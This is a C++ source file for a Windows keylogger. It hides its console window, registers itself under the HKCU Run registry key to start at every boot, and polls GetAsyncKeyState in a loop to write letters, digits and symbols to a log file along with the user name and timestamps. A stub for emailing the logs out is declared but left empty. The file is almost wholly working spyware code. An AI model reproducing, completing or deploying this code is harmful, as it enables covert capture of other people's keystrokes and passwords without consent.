// Keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "pch.h"

#define _CRT_SECURE_NO_WARNINGS                          //To Suppress time conversion Warning
#define _FILE_PATH "C:\\Users\\Pawan Kholiya\\Desktop\\logs.txt"

#include<Windows.h>
#include <iostream>
#include<Windows.h>
#include<stdlib.h>
#include<fstream>
#include<chrono>
#include<time.h>
#include<conio.h>
#include <direct.h>
#define GetCurrentDir _getcwd



using namespace std;

void HideWindow()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, SW_HIDE);
	
}
void ShowWindow()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, SW_SHOW);
}

void addToAutoStartup()
{
	/*
	char cCurrentPath[300];

	GetCurrentDir(cCurrentPath, sizeof(cCurrentPath));
	
//	cout << cCurrentPath;
	std::string progPath (cCurrentPath);
	progPath = "L\"" + progPath + "\\Keylogger.exe\"";
	//progPath = progPath;
	//std::cout<< progPath;
	
	std::wstring strr(progPath.begin(),progPath.end());
	int i = 0, j = 0;
	std::string k="ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd";
	for (i = 0; i < progPath.length(); i++)
	{
		if (progPath[i] == '\\')
			k[j++] = '\\';

		k[j++] = progPath[i];
	}
//	printf("%s", k.c_str());
	
	
	std::string s(k.begin(), k.begin() + j);
	printf("%s", s.c_str());
	
	
	
	/*for (i = 0; i < j; i++)
	{
		

		progPath[i] = k[i];
	}*/
	std::wstring progPath = L"C:\\Users\\Pawan Kholiya\\Desktop\\Logger\\Keylogger\\Debug\\Keylogger.exe";
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
	LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));

}
void mailto()
{
	/* Mail the logs.txt (previous records)
	   to my email address on every startup


	  Yet to Implement it!! Facing Problem
	*/

}

int main()
{
	HideWindow();     //Running Keylogger in Background
//	ShowWindow();     // For Debugging and Testing purposes  


	addToAutoStartup();   //Set it so that is would auto start on every Windows start up :-D

	fstream fil;

	fil.open(_FILE_PATH, ios::app); // Opens file
	char a[90];


	// Feed current time and date on Each new startup  
	auto end = chrono::system_clock::now();
    auto end_time = chrono::system_clock::to_time_t(end);

	
	//Appending user info,Date and Time to file
	// ON Every Startup!!
	DWORD size = 90;
	fil << "\n\n";
	GetUserNameA(a, &size);                    //Current System's User name  
	fil << "[User :]  " << a;
	fil << "\n[Date and Time :]  " << ctime(&end_time)<<"\n";


	mailto();
	while (1)
	{
		//myclock = clock();
		//cout << myclock << endl;;
		//auto key = 65;
		 
		char ch;
		for (auto key = 65; key <= 90; key++)
		{
			if (GetAsyncKeyState(key))
			{
				//converting to its character Equivalent
				ch = key;  

			//	cout << ch << " ";                  //Another Testing conditions
				fil << ch;
				/*
				if (ch == 'M')                      //Exit Condition to End Keylogger during Testing ends on pressing M 
					goto l1;                        
				*/

			}
		}
		


		if (GetAsyncKeyState(VK_RETURN))              
			fil << '\n';
		else
		if (GetAsyncKeyState(VK_SPACE))
			fil << ' ';
		else 
		if (GetAsyncKeyState(VK_BACK))
			fil << "[Backslash]";


		if (GetAsyncKeyState(VK_SHIFT))
		{
			if (GetAsyncKeyState(48))
				fil << ')';
			if (GetAsyncKeyState(49))
				fil << '!';
			if (GetAsyncKeyState(50))
				fil << '@';
			if (GetAsyncKeyState(51))
				fil << '#';
			if (GetAsyncKeyState(52))
				fil << '$';
			if (GetAsyncKeyState(53))
				fil << '%';
			if (GetAsyncKeyState(54))
				fil << '^';
			if (GetAsyncKeyState(55))
				fil << '&';
			if (GetAsyncKeyState(56))
				fil << '*';
			if (GetAsyncKeyState(57))
				fil << '(';

		}
		else
		{
			for (auto key = 48; key <= 57; key++)
			{
				if (GetAsyncKeyState(key))
				{
					//converting to its character Equivalent
					ch = key;
					fil << ch;

				}
			}

		}
			

		
		Sleep(150);

		//Continiously add data to the file to keep it updated 
		//after every entry !

		fil.close();                                  
		fil.open(_FILE_PATH, ios::app);

	}
l1:
	fil.close();
	std::cout << "Hello World!\n";
}

